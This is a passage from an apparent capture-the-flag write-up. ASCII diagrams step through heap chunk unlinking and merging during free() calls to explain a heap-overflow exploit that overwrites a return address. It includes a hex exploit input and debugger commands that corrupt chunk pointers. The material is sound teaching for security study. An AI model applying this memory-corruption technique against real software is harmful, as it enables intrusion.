│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  509c  │  515c  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  50fc  │  51bc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    
</code></pre>
  </section>
  <section id="normal-free-call-4">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ FREE CALL #2 │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  <mark>50fc</mark>  │  00b4  │                    
  └────────┴────────┴────────┘                    
              ▲                                   
              │ ┌────────────────────┐            
              │ │UPDATE PREV CHUNK FD│            
              │ └────────────────────┘            
                                                  
  ┌────────┬────────┬────────┐  ┌────────────────┐
  │  503c  │  50fc  │  <mark>00b4</mark>  │◄─┤UNSET IN-USE BIT│
  └────────┴────────┴────────┘  └────────────────┘
                                                  
     │ ┌────────────────────┐                     
     │ │UPDATE NEXT CHUNK BK│                     
     │ └────────────────────┘                     
     ▼                                            
  ┌────────┬────────┬────────┐                    
  │  <mark>503c</mark>  │  515c  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  50fc  │  51bc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    
</code></pre>
  </section>
  <section id="normal-free-call-5">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ FREE CALL #2 │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘

  ┌────────┬────────┬────────┐
  │  ....  │  ....  │  ....  │
  └────────┴─────┬──┴────────┘
     ▲           │
┌────┘           │  ┌───────────────────────────────────┐
│                │  │             ADD SIZES             │
│    ┌───────────┘  └───────────────────────────────────┘
│    ▼
│ ┌────────┬────────┬────────┐    ┌────────┐   ┌────────┐
└─┤  5026  │  50fc  │  <mark>00b4</mark>  │ += │  <mark>0006</mark>  │ + │  <mark>00b4</mark>  │
  └────────┴────────┴────────┘    └────────┘   └────────┘
  ▲                          ▲       ▲            ▲
  └────┬────────┬──────┬─────┘       │            │
       │ LENGTH │ 0006 │             │            │
       └────────┴──────┘ ────────────┘            │
                                                  │
  ┌────────┬────────┬────────┐                    │
  │  503c  │  50fc  │  00b4  │ ───────────────────┘
  └────────┴────────┴────────┘





  ┌────────┬────────┬────────┐
  │  503c  │  515c  │  00b5  │
  └────────┴─────┬──┴────────┘
     ▲           │
┌────┘           │
│                │
│    ┌───────────┘
│    ▼
│ ┌────────┬────────┬────────┐
└─┤  50fc  │  51bc  │  00b5  │
  └────────┴─────┬──┴────────┘
     ▲           │
┌────┘           │
│                │
│    ┌───────────┘
│    ▼
│ ┌────────┬────────┬────────┐
└─┤  ....  │  ....  │  ....  │
  └────────┴────────┴────────┘
</code></pre>
  </section>
  <section id="normal-free-call-6">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ FREE CALL #2 │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  50fc  │  016e  │                    
  └────────┴────────┴────────┘                    
  ▲        ▲        ▲        ▲                    
  │        │        │        │                    
  │        │        │        │                    
  ├────────┴────────┴────────┤                    
  │                          │                    
  │          CHUNK           │                    
  │          MERGE           │                    
  │                          │                    
  └──────────────────────────┘                    
  ▲        ▲        ▲        ▲                    
  │        │        │        │                    
  │        │        │        │                    
                                                  
  ┌────────┬────────┬────────┐                    
  │  503c  │  515c  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  50fc  │  51bc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    
</code></pre>
  </section>
  <section id="normal-free-call-7">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ <mark>FREE CALL #3</mark> │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  50fc  │  016e  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  503c  │  515c  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  50fc  │  51bc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    








</code></pre>
  </section>
  <section id="normal-free-call-8">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ FREE CALL #3 │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  <mark>515c</mark>  │  016e  │                    
  └────────┴────────┴────────┘                    
              ▲                                   
              │ ┌────────────────────┐            
              │ │UPDATE PREV CHUNK FD│            
              │ └────────────────────┘            
                                                  
  ┌────────┬────────┬────────┐  ┌────────────────┐
  │  503c  │  515c  │  <mark>00b4</mark>  │◄─┤UNSET IN-USE BIT│
  └────────┴────────┴────────┘  └────────────────┘
                                                  
     │ ┌────────────────────┐                     
     │ │UPDATE NEXT CHUNK BK│                     
     │ └────────────────────┘                     
     ▼                                            
  ┌────────┬────────┬────────┐                    
  │  <mark>503c</mark>  │  51bc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    








</code></pre>
  </section>
  <section id="normal-free-call-9">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐       
  │           HEAP           │    │              │       
  ├────────┬────────┬────────┤    │ FREE CALL #3 │       
  │   BK   │   FD   │  SIZE  │    │              │       
  └────────┴────────┴────────┘    └──────────────┘       
                                                         
  ┌────────┬────────┬────────┐                           
  │  ....  │  ....  │  ....  │                           
  └────────┴─────┬──┴────────┘                           
     ▲           │                                       
┌────┘           │  ┌───────────────────────────────────┐
│                │  │             ADD SIZES             │
│    ┌───────────┘  └───────────────────────────────────┘
│    ▼                                                   
│ ┌────────┬────────┬────────┐    ┌────────┐   ┌────────┐
└─┤  5026  │  515c  │  <mark>016e</mark>  │ += │  <mark>0006</mark>  │ + │  <mark>00b4</mark>  │
  └────────┴────────┴────────┘    └────────┘   └────────┘
  ▲                          ▲       ▲            ▲      
  └────┬────────┬──────┬─────┘       │            │      
       │ LENGTH │ 0006 │             │            │      
       └────────┴──────┘ ────────────┘            │      
                                                  │      
  ┌────────┬────────┬────────┐                    │      
  │  503c  │  515c  │  00b4  │ ───────────────────┘      
  └────────┴────────┴────────┘                           
                                                         
                                                         
                                                         
                                                         
                                                         
  ┌────────┬────────┬────────┐                           
  │  503c  │  51bc  │  00b5  │                           
  └────────┴─────┬──┴────────┘                           
     ▲           │                                       
┌────┘           │                                       
│                │                                       
│    ┌───────────┘                                       
│    ▼                                                   
│ ┌────────┬────────┬────────┐                           
└─┤  ....  │  ....  │  ....  │                           
  └────────┴────────┴────────┘                           








</code></pre>
  </section>
  <section id="normal-free-call-10">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ FREE CALL #3 │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  515c  │  0228  │                    
  └────────┴────────┴────────┘                    
  ▲        ▲        ▲        ▲                    
  │        │        │        │                    
  │        │        │        │                    
  ├────────┴────────┴────────┤                    
  │                          │                    
  │          CHUNK           │                    
  │          MERGE           │                    
  │                          │                    
  └──────────────────────────┘                    
  ▲        ▲        ▲        ▲                    
  │        │        │        │                    
  │        │        │        │                    
                                                  
  ┌────────┬────────┬────────┐                    
  │  503c  │  51bc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    








</code></pre>
  </section>
  <section id="normal-free-call-11">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ <mark>FREE CALL #4</mark> │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  515c  │  0228  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  503c  │  51bc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    
















</code></pre>
  </section>
  <section id="normal-free-call-12">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ FREE CALL #4 │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  <mark>51bc</mark>  │  0228  │                    
  └────────┴────────┴────────┘                    
              ▲                                   
              │ ┌────────────────────┐            
              │ │UPDATE PREV CHUNK FD│            
              │ └────────────────────┘            
                                                  
  ┌────────┬────────┬────────┐  ┌────────────────┐
  │  503c  │  51bc  │  <mark>00b4</mark>  │◄─┤UNSET IN-USE BIT│
  └────────┴────────┴────────┘  └────────────────┘
                                                  
     │ ┌────────────────────┐                     
     │ │UPDATE NEXT CHUNK BK│                     
     │ └────────────────────┘                     
     ▼                                            
  ┌────────┬────────┬────────┐                    
  │  <mark>....</mark>  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    
















</code></pre>
  </section>
  <section id="normal-free-call-13">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐       
  │           HEAP           │    │              │       
  ├────────┬────────┬────────┤    │ FREE CALL #4 │       
  │   BK   │   FD   │  SIZE  │    │              │       
  └────────┴────────┴────────┘    └──────────────┘       
                                                         
  ┌────────┬────────┬────────┐                           
  │  ....  │  ....  │  ....  │                           
  └────────┴─────┬──┴────────┘                           
     ▲           │                                       
┌────┘           │  ┌───────────────────────────────────┐
│                │  │             ADD SIZES             │
│    ┌───────────┘  └───────────────────────────────────┘
│    ▼                                                   
│ ┌────────┬────────┬────────┐    ┌────────┐   ┌────────┐
└─┤  5026  │  51bc  │  <mark>0228</mark>  │ += │  <mark>0006</mark>  │ + │  <mark>00b4</mark>  │
  └────────┴────────┴────────┘    └────────┘   └────────┘
  ▲                          ▲       ▲            ▲      
  └────┬────────┬──────┬─────┘       │            │      
       │ LENGTH │ 0006 │             │            │      
       └────────┴──────┘ ────────────┘            │      
                                                  │      
  ┌────────┬────────┬────────┐                    │      
  │  503c  │  51bc  │  00b4  │ ───────────────────┘      
  └────────┴────────┴────────┘                           
                                                         
                                                         
                                                         
                                                         
                                                         
  ┌────────┬────────┬────────┐                           
  │  ....  │  ....  │  ....  │                           
  └────────┴────────┴────────┘                           
















</code></pre>
  </section>
  <section id="normal-free-call-14">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ FREE CALL #4 │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  51bc  │  02e2  │                    
  └────────┴────────┴────────┘                    
  ▲        ▲        ▲        ▲                    
  │        │        │        │                    
  │        │        │        │                    
  ├────────┴────────┴────────┤                    
  │                          │                    
  │          CHUNK           │                    
  │          MERGE           │                    
  │                          │                    
  └──────────────────────────┘                    
  ▲        ▲        ▲        ▲                    
  │        │        │        │                    
  │        │        │        │                    
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    
















</code></pre>
  </section>
  <section id="normal-free-call-15">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐
  │           HEAP           │
  ├────────┬────────┬────────┤
  │   BK   │   FD   │  SIZE  │
  └────────┴────────┴────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  5026  │  51bc  │  02e2  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    
























</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#normal-free-call-1">01</a></li>
  <li><a href="#normal-free-call-2">02</a></li>
  <li><a href="#normal-free-call-3">03</a></li>
  <li><a href="#normal-free-call-4">04</a></li>
  <li><a href="#normal-free-call-5">05</a></li>
  <li><a href="#normal-free-call-6">06</a></li>
  <li><a href="#normal-free-call-7">07</a></li>
  <li><a href="#normal-free-call-8">08</a></li>
  <li><a href="#normal-free-call-9">09</a></li>
  <li><a href="#normal-free-call-10">10</a></li>
  <li><a href="#normal-free-call-11">11</a></li>
  <li><a href="#normal-free-call-12">12</a></li>
  <li><a href="#normal-free-call-13">13</a></li>
  <li><a href="#normal-free-call-14">14</a></li>
  <li><a href="#normal-free-call-15">15</a></li>
</ul>

<p>These actions are constituent steps in the part of the <code>free</code> algorithm that consolidates adjacent free chunks. Notice how it adds the cumulative sizes to the size field in the chunk just before the overflowed one.</p>

<pre><code class='language-ascii-noshadows'>  ┌───────────────────────────────┬───────────────────────────────┐
  │        BEFORE FREE #1         │         AFTER FREE #4         │
  └───────────────────────────────┼───────────────────────────────┘
                                  │                                
  ┌──────────────────────────┐    │    ┌──────────────────────────┐
  │           HEAP           │    │    │           HEAP           │
  ├────────┬────────┬────────┤    │    ├────────┬────────┬────────┤
  │   BK   │   FD   │  SIZE  │    │    │   BK   │   FD   │  SIZE  │
  └────────┴────────┴────────┘    │    └────────┴────────┴────────┘
                                  │                                
  ┌────────┬────────┬────────┐    │    ┌────────┬────────┬────────┐
  │  ....  │  ....  │  ....  │    │    │  ....  │  ....  │  ....  │
  └────────┴─────┬──┴────────┘    │    └────────┴─────┬──┴────────┘
     ▲           │                │       ▲           │            
┌────┘           │                │  ┌────┘           │            
│                │                │  │                │            
│    ┌───────────┘                │  │    ┌───────────┘            
│    ▼                            │  │    ▼                        
│ ┌────────┬────────┬────────┐    │  │ ┌────────┬────────┬────────┐
└─┤  5026  │  509c  │  <mark>00b5</mark>  │    │  └─┤  5026  │  51bc  │  <mark>02e2</mark>  │
  └────────┴─────┬──┴────────┘    │    └────────┴─────┬──┴────────┘
     <mark>▲</mark>           │                │       ▲           │            
<mark>┌────┘</mark>           │                │  ┌────┘           │            
<mark>│</mark>                │                │  │                │            
<mark>│</mark>    ┌───────────┘                │  │    ┌───────────┘            
<mark>│</mark>    ▼                            │  │    ▼                        
<mark>│</mark> ┌────────┬────────┬────────┐    │  │ ┌────────┬────────┬────────┐
<mark>└─</mark>┤  <u><mark>503c</mark></u>  │  <u>50fc</u>  │  <u>00b5</u>  │    │  └─┤  ....  │  ....  │  ....  │
  └────────┴─────┬──┴────────┘    │    └────────┴────────┴────────┘
     ▲           │                │                                
┌────┘           │                │                                
│                │                │                                
│    ┌───────────┘                │                                
│    ▼                            │                                
│ ┌────────┬────────┬────────┐    │                                
└─┤  509c  │  515c  │  00b5  │    │                                
  └────────┴─────┬──┴────────┘    │                                
     ▲           │                │                                
┌────┘           │                │                                
│                │                │                                
│    ┌───────────┘                │                                
│    ▼                            │                                
│ ┌────────┬────────┬────────┐    │                                
└─┤  50fc  │  51bc  │  00b5  │    │                                
  └────────┴─────┬──┴────────┘    │                                
     ▲           │                │                                
┌────┘           │                │                                
│                │                │                                
│    ┌───────────┘                │                                
│    ▼                            │                                
│ ┌────────┬────────┬────────┐    │                                
└─┤  ....  │  ....  │  ....  │    │                                
  └────────┴────────┴────────┘    │                                
</code></pre>

<p>Corrupting the back pointer and aiming it at a stack location near a return address can be represented as follows.</p>

<pre><code class='language-ascii-noshadows'>┌──────────────────────────┐        ┌──────────────────────────┐
│          STACK           │        │           HEAP           │
├────────┬────────┬────────┤        ├────────┬────────┬────────┤
│  "BK"  │  "FD"  │ "SIZE" │        │   BK   │   FD   │  SIZE  │
└────────┴────────┴────────┘        └────────┴────────┴────────┘
                                                                
┌────────┬────────┬────────┐        ┌────────┬────────┬────────┐
│  0000  │  3e4a  │  4cbc  │        │  ....  │  ....  │  ....  │
└────────┴────────┴────────┘        └────────┴─────┬──┴────────┘
   <mark>▲</mark>                                   ▲           │            
   <mark>│</mark>                              ┌────┘           │            
   <mark>│</mark>                              │                │            
   <mark>│</mark>                              │    ┌───────────┘            
   <mark>│</mark>                              │    ▼                        
   <mark>│</mark>                              │ ┌────────┬────────┬────────┐
   <mark>│</mark>                              └─┤  5026  │  509c  │  00b5  │
   <mark>│</mark>                                └────────┴─────┬──┴────────┘
   <mark>│</mark>                                               │            
   <mark>│</mark>                                               │            
   <mark>│</mark>                                               │            
   <mark>│</mark>                                   ┌───────────┘            
   <mark>│</mark>                                   ▼                        
   <mark>│</mark>                                ┌────────┬────────┬────────┐
   <mark>└────────────────────────────────</mark>┤  <mark><u>3de6</u></mark>  │  <u>50fc</u>  │  <u>0013</u>  │
                                    └────────┴─────┬──┴────────┘
                                       ▲           │            
                                  ┌────┘           │            
                                  │                │            
                                  │    ┌───────────┘            
                                  │    ▼                        
                                  │ ┌────────┬────────┬────────┐
                                  └─┤  509c  │  515c  │  00b5  │
                                    └────────┴─────┬──┴────────┘
                                       ▲           │            
                                  ┌────┘           │            
                                  │                │            
                                  │    ┌───────────┘            
                                  │    ▼                        
                                  │ ┌────────┬────────┬────────┐
                                  └─┤  50fc  │  51bc  │  00b5  │
                                    └────────┴─────┬──┴────────┘
                                       ▲           │            
                                  ┌────┘           │            
                                  │                │            
                                  │    ┌───────────┘            
                                  │    ▼                        
                                  │ ┌────────┬────────┬────────┐
                                  └─┤  ....  │  ....  │  ....  │
                                    └────────┴────────┴────────┘
</code></pre>

<p>The stack location is <em>technically</em> just another chunk resident in the linked list—although it is only single-linked rather than double-linked.</p>

<pre><code class='language-ascii-noshadows'>                ┌──────────────────────────┐  
                │           HEAP           │  
                ├────────┬────────┬────────┤  
                │   BK   │   FD   │  SIZE  │  
                └────────┴────────┴────────┘  
                                              
                ┌────────┬────────┬────────┐  
                │  ....  │  ....  │  ....  │  
                └────────┴─────┬──┴────────┘  
                   ▲           │              
              ┌────┘           │              
              │                │              
              │    ┌───────────┘              
              │    ▼                          
              │ ┌────────┬────────┬────────┐  
              └─┤  5026  │  509c  │  00b5  │  
                └────────┴─────┬──┴────────┘  
                               │              
                               │              
                               │              
                               └─────────────┐
                                             │
┌────────────┬─►┌────────┬────────┬────────┐ │
│STACK MEMORY│  │  0000  │  3e4a  │  4cbc  │ │
└────────────┴─►└────────┴────────┴────────┘ │
		   <mark>▲</mark>                         │
              <mark>┌────┘</mark>                         │
              <mark>│</mark>                              │
              <mark>│</mark>    ┌─────────────────────────┘
              <mark>│</mark>    ▼                          
              <mark>│</mark> ┌────────┬────────┬────────┐  
	      <mark>└─</mark>┤  <u><mark>3de6<mark></u>  │  <u>50fc</u>  │  <u>0013</u>  │  
                └────────┴─────┬──┴────────┘  
                   ▲           │              
              ┌────┘           │              
              │                │              
              │    ┌───────────┘              
              │    ▼                          
              │ ┌────────┬────────┬────────┐  
              └─┤  509c  │  515c  │  00b5  │  
                └────────┴─────┬──┴────────┘  
                   ▲           │              
              ┌────┘           │              
              │                │              
              │    ┌───────────┘              
              │    ▼                          
              │ ┌────────┬────────┬────────┐  
              └─┤  50fc  │  51bc  │  00b5  │  
                └────────┴─────┬──┴────────┘  
                   ▲           │              
              ┌────┘           │              
              │                │              
              │    ┌───────────┘              
              │    ▼                          
              │ ┌────────┬────────┬────────┐  
              └─┤  ....  │  ....  │  ....  │  
                └────────┴────────┴────────┘  
</code></pre>

<p>From the perspective of the <code>free</code> algorithm, the chunk "before the overflowed one" is now on the stack (denoted by "S" below). Such an arrangement means the algorithm interprets that stack location as the chunk with which all "adjacent" free chunks should consolidate. This process repeatedly updates the "size" field overlapping the return address, breaking the exploit.</p>

<pre><code class='language-ascii-noshadows'>
  ┌───────────────────────────────┬───────────────────────────────┐  
  │        BEFORE FREE #1         │         AFTER FREE #4         │  
  └───────────────────────────────┼───────────────────────────────┘  
                                  │                                  
  ┌──────────────────────────┐    │    ┌──────────────────────────┐  
  │           HEAP           │    │    │           HEAP           │  
  ├────────┬────────┬────────┤    │    ├────────┬────────┬────────┤  
  │   BK   │   FD   │  SIZE  │    │    │   BK   │   FD   │  SIZE  │  
  └────────┴────────┴────────┘    │    └────────┴────────┴────────┘  
                                  │                                  
  ┌────────┬────────┬────────┐    │    ┌────────┬────────┬────────┐  
  │  ....  │  ....  │  ....  │    │    │  ....  │  ....  │  ....  │  
  └────────┴─────┬──┴────────┘    │    └────────┴─────┬──┴────────┘  
     ▲           │                │       ▲           │              
┌────┘           │                │  ┌────┘           │              
│                │                │  │                │              
│    ┌───────────┘                │  │    ┌───────────┘              
│    ▼                            │  │    ▼                          
│ ┌────────┬────────┬────────┐    │  │ ┌────────┬────────┬────────┐  
└─┤  5026  │  509c  │  00b5  │    │  └─┤  5026  │  509c  │  00b5  │  
  └────────┴─────┬──┴────────┘    │    └────────┴─────┬──┴────────┘  
                 │                │                   │              
                 │                │                   │              
                 │                │                   │              
                 └─────────────┐  │                   └─────────────┐
                               │  │                                 │
┌─┬────────┬────────┬────────┐ │  │  ┌─┬────────┬────────┬────────┐ │
│<mark>S</mark>│  0000  │  3e4a  │  <mark>4cbc</mark>  │ │  │  │<mark>S</mark>│  0000  │  51bc  │  <mark>4e48</mark>  │ │
└─┴────────┴────────┴────────┘ │  │  └─┴────────┴────────┴────────┘ │
     <mark>▲</mark>                         │  │       ▲                         │
<mark>┌────┘</mark>                         │  │  ┌────┘                         │
<mark>│</mark>                              │  │  │                              │
<mark>│</mark>    ┌─────────────────────────┘  │  │    ┌─────────────────────────┘
<mark>│</mark>    ▼                            │  │    ▼                          
<mark>│</mark> ┌────────┬────────┬────────┐    │  │ ┌────────┬────────┬────────┐  
<mark>└─</mark>┤  <mark><u>3de6</u></mark>  │  <u>50fc</u>  │  <u>0013</u>  │    │  └─┤  ....  │  ....  │  ....  │  
  └────────┴─────┬──┴────────┘    │    └────────┴────────┴────────┘  
     ▲           │                │                                  
┌────┘           │                │                                  
│                │                │                                  
│    ┌───────────┘                │                                  
│    ▼                            │                                  
│ ┌────────┬────────┬────────┐    │                                  
└─┤  509c  │  515c  │  00b5  │    │                                  
  └────────┴─────┬──┴────────┘    │                                  
     ▲           │                │                                  
┌────┘           │                │                                  
│                │                │                                  
│    ┌───────────┘                │                                  
│    ▼                            │                                  
│ ┌────────┬────────┬────────┐    │                                  
└─┤  50fc  │  51bc  │  00b5  │    │                                  
  └────────┴─────┬──┴────────┘    │                                  
     ▲           │                │                                  
┌────┘           │                │                                  
│                │                │                                  
│    ┌───────────┘                │                                  
│    ▼                            │                                  
│ ┌────────┬────────┬────────┐    │                                  
└─┤  ....  │  ....  │  ....  │    │                                  
  └────────┴────────┴────────┘    │                                  
</code></pre>

<p>The question is why this does not happen with the 61-byte exploit, which overwrites the same return address. Consider what happens when aiming the forward pointer two chunks ahead.</p>

<p>First, set a breakpoint at the start of the <code>free</code> function.</p>

<pre><code>break free</code></pre> 

<p>Send the exploit.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63dfc5013
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>

<p>Continue execution until the start of <code>free</code> and modify the forward pointer via the following debugger command.</p>

<pre><code>c; let 509e = 515c</code></pre>

<p>This results in the following behavior.</p>


<pre><code class='language-ascii-noshadows'>  ┌───────────────────────────────┬───────────────────────────────┐  
  │        BEFORE FREE #1         │         AFTER FREE #4         │  
  └───────────────────────────────┼───────────────────────────────┘  
                                  │                                  
  ┌──────────────────────────┐    │    ┌──────────────────────────┐  
  │           HEAP           │    │    │           HEAP           │  
  ├────────┬────────┬────────┤    │    ├────────┬────────┬────────┤  
  │   BK   │   FD   │  SIZE  │    │    │   BK   │   FD   │  SIZE  │  
  └────────┴────────┴────────┘    │    └────────┴────────┴────────┘  
                                  │                                  
  ┌────────┬────────┬────────┐    │    ┌────────┬────────┬────────┐  
  │  ....  │  ....  │  ....  │    │    │  ....  │  ....  │  ....  │  
  └────────┴─────┬──┴────────┘    │    └────────┴─────┬──┴────────┘  
     ▲           │                │       ▲           │              
┌────┘           │                │  ┌────┘           │              
│                │                │  │                │              
│    ┌───────────┘                │  │    ┌───────────┘              
│    ▼                            │  │    ▼                          
│ ┌────────┬────────┬────────┐    │  │ ┌────────┬────────┬────────┐  
└─┤  5026  │  509c  │  00b4  │    │  └─┤  5026  │  509c  │  00b4  │  
  └────────┴─────┬──┴────────┘    │    └────────┴─────┬──┴────────┘  
                 │                │                   │              
                 │                │                   │              
                 │                │                   │              
                 └─────────────┐  │                   └─────────────┐
                               │  │                                 │
┌─┬────────┬────────┬────────┐ │  │  ┌─┬────────┬────────┬────────┐ │
│<mark>S</mark>│  0000  │  3e4a  │  4cbc  │ │  │  │<mark>S</mark>│  0000  │  515c  │  4cd4  │ │
└─┴────────┴────────┴────────┘ │  │  └─┴────────┴────────┴────────┘ │
     ▲                         │  │       ▲                         │
┌────┘                         │  │  ┌────┘                         │
│                              │  │  │                              │
│    ┌─────────────────────────┘  │  │    ┌─────────────────────────┘
